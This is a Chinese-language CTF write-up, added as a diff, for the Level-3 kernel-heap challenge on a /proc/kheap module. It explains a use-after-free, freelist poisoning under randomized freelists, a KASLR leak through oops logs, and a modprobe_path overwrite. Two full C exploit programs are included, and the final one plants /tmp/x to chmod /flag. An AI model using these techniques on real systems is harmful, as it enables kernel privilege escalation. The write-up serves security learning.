@@ -619,3 +619,224 @@ int main() {
 通过`sudo cat /proc/slabinfo`可以看到这题使用的slab的细节
 
 不过我发现调用`work_for_cpu_fn+5`会失败，因为函数末尾的`pop rbx`。老老实实从`push rbx`开始就行了
+
+### Level-3
+
+我写过最抽象的逆天exp
+
+这题的难点并不是描述里说的“开了aslr”，而是ioctl中不再存在无限的堆溢出。还好ioctl多了个调用kmem_cache_free释放当前fd对应的堆结构（ghidra里是`filp->private_data`），一个很明显的uaf
+
+检查一个释放后的堆块，发现里面存在指向下一个空闲堆块的指针。kernel的slab管理器用单项链表管理freelist，所以直接覆盖这个指针就能拿到任意地址处的堆块了对吧？
+
+对但是不对。题目开启了randomized freelist。我以为这玩意只会“随机化slab给出的slot顺序”，事实上它还会使释放后的对象在链表的随机位置插入，而不是直接插入链表头部。这就导致我们无法像用户态tcache poisoning一样精准控制何时会拿到目标地址处的堆块。解决办法是无脑堆喷，反正总会拿到的
+
+需要找个方法泄漏地址从而绕过kaslr。我想的办法是，先用uaf篡改一个堆块的链表指针指向原地址减去0x10的地方，然后再覆盖某个堆结构的函数指针为任意一个无效的地址。最后ioctl调用函数指针，利用kernel oops的日志内容泄漏地址。幸运的是，题目环境没开panic on oops，所以oops不会让整个kernel崩溃重启；而且打印出来的寄存器信息中r10的值正好是一个kernel内的地址。先放出这一阶段的脚本：
+```c
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <unistd.h>
+#include <stdio.h>
+const char* find_8byte_strings(const void *buffer, size_t buffer_size) {
+    const char *ptr = (const char *)buffer;
+    size_t num_strings = buffer_size / 8;
+    for (size_t i = 0; i < num_strings; i++) {
+        const char *current_str = ptr + (i * 8);
+        if(current_str[1]!=0){
+            printf("Found 8-byte string at offset %zu: ", i * 8);
+            for (int j = 0; j < 8; j++) {
+                printf("%02x ", (unsigned char)current_str[j]); 
+            }
+            printf("\n");
+            return current_str;
+        }
+    }
+    return NULL;
+}
+uint64_t binary_string_to_u64(const char *binary_str) {
+    uint64_t result;
+    memcpy(&result, binary_str, 8);
+    return result;
+}
+void u64_to_binary_string(uint64_t num, char *output) {
+    memcpy(output, &num, 8);
+}
+int main() {
+    char buf[0x1d0];
+    int fd_count=2;
+    unsigned long arg[2];
+    int fds[fd_count];
+    for(int i=0;i<fd_count;i++){
+        fds[i]=open("/proc/kheap", O_RDWR);
+    }
+    arg[0]=(unsigned long)buf;
+    arg[1]=sizeof(buf);
+    ioctl(fds[0],0x5703,arg);
+    ioctl(fds[1],0x5703,arg);
+    ioctl(fds[0],0x5700,arg);
+    const char* leak=find_8byte_strings(buf, sizeof(buf));
+    char *pos = memmem(buf,sizeof(buf), leak, 8);
+    uint64_t info=binary_string_to_u64(leak);
+    printf("info: %llx\n",info);
+    info-=0x10;
+    char output[8];
+    u64_to_binary_string(info,output);
+    memcpy(pos,output,8);
+    ioctl(fds[0],0x5701,arg);
+    memcpy(buf+8,"\x74\x55\x0a\x81\xff\xff\xff\xff",8);
+    int victim_count=6; //调用一次后改为14再重新编译
+    printf("victim_count: %d\n",victim_count);
+    int victimFds[victim_count];
+    for(int i=0;i<victim_count;i++){
+        victimFds[i]=open("/proc/kheap", O_RDWR);
+        ioctl(victimFds[i],0x5701,arg);
+    }
+    printf("Finish spraying\n");
+    for(int i=0;i<fd_count;i++){
+        printf("ioctl: fds[%d]\n",i);
+        ioctl(fds[i],0x5702,arg);
+    }
+    for(int i=0;i<victim_count;i++){
+        printf("ioctl: victimFds[%d]\n",i);
+        ioctl(victimFds[i],0x5702,arg);
+    }
+    for(int i=0;i<fd_count;i++){
+        close(fds[i]);
+    }
+    for(int i=0;i<victim_count;i++){
+        close(victimFds[i]);
+    }
+    return 0;
+}
+```
+至于注释是什么意思……不知道为什么，如果固定victim_count就没办法触发漏洞。我发现调用一次脚本后slabinfo会显示active_objs的数量从8变到了16；所以我把victim_count换成16-2=14后编译运行，连续运行两次后基本稳定触发oops……如果运气不好遇见脚本在第一次运行时就卡死或者日志里显示的无效rip不是`0xffffffff810a5574`，直接重启环境即可
+
+所以接下来用什么方式拿flag？上一题的方法行不通，因为泄漏出来的地址和init_cred不在同一个数据段，没法通过泄漏的地址算出init_cred。是时候让早有耳闻的[modprobe](https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe)登场了
+
+这里省略一堆我痛苦的调试过程。kaslr开启的情况下gdb的符号全部没了。去服务器找到了解决方法。首先运行这个bash脚本：
+```sh
+#!/bin/bash -e
+vmlinux=$([ -e '/challenge/vmlinux' ] && echo '/challenge/vmlinux' || echo '/opt/linux/vmlinux')
+kbase=$(printf '0x%s' $(nm $vmlinux | grep -w startup_64 | cut -d' ' -f1))
+kaslr_base=$(printf '0x%s' $(vm exec 'sudo grep -w startup_64 /proc/kallsyms' | cut -d' ' -f1))
+kaslr_offset=$(printf '0x%x' $(( $kaslr_base - $kbase )))
+echo symbol-file $vmlinux -o $kaslr_offset > /tmp/add-symbols
+module=$(echo /challenge/*.ko)
+this_module=$(readelf -p .gnu.linkonce.this_module $module | sed -n 4p | cut -d' ' -f9)
+text_base=$(vm exec $(printf 'sudo cat /sys/module/%s/sections/.text' $this_module) | cut -f1)
+echo add-symbol-file $module -s .text $text_base >> /tmp/add-symbols
+mv /tmp/add-symbols /home/hacker/add-symbols
+```
+（最后一行我自己加的，假如在虚拟机内部运行脚本的话gdb里是访问不了虚拟机下/tmp的文件的。但是似乎在外部运行拿到的又不是虚拟机里的kaslr偏移？）
+
+然后gdb内部运行`source /home/hacker/add-symbols`。有了符号调试就简单多了，复刻第一阶段的漏洞利用，只不过这次把分配的目标地址换成`modprobe-0x10`
+
+然后我就经历了比chrome v8还噩梦的调试过程。虽然已成功修改`modprobe_path`，但运行时kernel要么崩溃要么直接卡死。前者倒还好，后者直接导致整个session废了，需要重新开一个ssh。然而新的ssh对应的还是同一个实例，失败的exp直接把堆搞乱了，之后再怎么修改都没法成功。只能出去运行`vm restart`。但是`vm restart`后再start再connect后发现登录的还是同一个实例（dmesg打印出来的内容是一样的）？换成`vm stop`后好了些，但仍然会遇到kernel卡死或是vm debug连接不上的情况。这个时候我选择直接退出去重新开一个practice环境。听起来不是很复杂，但考虑每条命令运行的耗时都慢得要死，整个过程就是纯纯折磨
+
+最后找到了原因。`kmem_cache_alloc`会清空分配到的堆块，而`modprobe_path`后存在有用的数据。解决办法是gdb调试查看原本的值是什么，然后全部恢复
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+#include <string.h>
+#include <sys/stat.h>
+void prepare_modprobe_files() {
+    system("echo '#!/bin/sh\nchmod 777 /flag' > /tmp/x");
+    system("chmod +x /tmp/x");
+    system("printf '\xff\xff\xff\xff' > /tmp/dummy"); //不知道为什么echo -ne不行
+    system("chmod +x /tmp/dummy");
+}
+const char* find_8byte_strings(const void *buffer, size_t buffer_size) {
+    const char *ptr = (const char *)buffer;
+    size_t num_strings = buffer_size / 8;
+    for (size_t i = 0; i < num_strings; i++) {
+        const char *current_str = ptr + (i * 8);
+        if(current_str[1]!=0){
+            printf("Found 8-byte string at offset %zu: ", i * 8);
+            for (int j = 0; j < 8; j++) {
+                printf("%02x ", (unsigned char)current_str[j]); 
+            }
+            printf("\n");
+            return current_str;
+        }
+    }
+    return NULL;
+}
+uint64_t binary_string_to_u64(const char *binary_str) {
+    uint64_t result;
+    memcpy(&result, binary_str, 8);
+    return result;
+}
+void u64_to_binary_string(uint64_t num, char *output) {
+    memcpy(output, &num, 8);
+}
+int main() {
+    prepare_modprobe_files();
+    uint64_t modprobe=0xffffffff89e58c20+0xe68a0-0x40;
+    printf("modprobe: %llx\n",modprobe);
+    char buf[0x1d0];
+    int fd_count=2;
+    unsigned long arg[2];
+    int fds[fd_count];
+    for(int i=0;i<fd_count;i++){
+        fds[i]=open("/proc/kheap", O_RDWR);
+    }
+    arg[0]=(unsigned long)buf;
+    arg[1]=sizeof(buf);
+    ioctl(fds[0],0x5703,arg);
+    ioctl(fds[1],0x5703,arg);
+    ioctl(fds[0],0x5700,arg);
+    const char* leak=find_8byte_strings(buf, sizeof(buf));
+    char *pos = memmem(buf,sizeof(buf), leak, 8);
+    uint64_t info=binary_string_to_u64(leak);
+    printf("info: %llx\n",info);
+    char output[8];
+    u64_to_binary_string(modprobe,output);
+    memcpy(pos,output,8);
+    ioctl(fds[0],0x5701,arg);
+    memset(buf, 0, sizeof(buf));
+    strcpy(buf+0x38,"/tmp/x");
+    unsigned long *ul_buf = (unsigned long *)buf;
+    int off=39;
+    ul_buf[off++]=0x0000003200000000;
+    ul_buf[off++]=modprobe+0x148;
+    ul_buf[off++]=modprobe+0x148;
+    ul_buf[off++]=0;
+    ul_buf[off++]=0;
+    ul_buf[off++]=0;
+    ul_buf[off++]=modprobe+0x170;
+    ul_buf[off++]=modprobe+0x170;
+    ul_buf[off++]=1;
+    ul_buf[off++]=0;
+    ul_buf[off++]=0;
+    ul_buf[off++]=0;
+    ul_buf[off++]=modprobe-0x48172d;
+    ul_buf[off++]=modprobe+0x220;
+    ul_buf[off++]=0x000001a400000004;
+    ul_buf[off++]=0;
+    ul_buf[off++]=modprobe-0x1a0d0a0;
+    ul_buf[off++]=0;
+    ul_buf[off++]=modprobe-0x9310a0;
+    int victim_count=14;
+    int victimFds[victim_count];
+    for(int i=0;i<victim_count;i++){
+        victimFds[i]=open("/proc/kheap", O_RDWR);
+        ioctl(victimFds[i],0x5701,arg);
+    }
+    puts("Done overwriting");
+    system("/tmp/dummy");
+    system("cat /flag");
+    for(int i=0;i<fd_count;i++){
+        close(fds[i]);
+    }
+    for(int i=0;i<victim_count;i++){
+        close(victimFds[i]);
+    }
+    return 0;
+}
+```
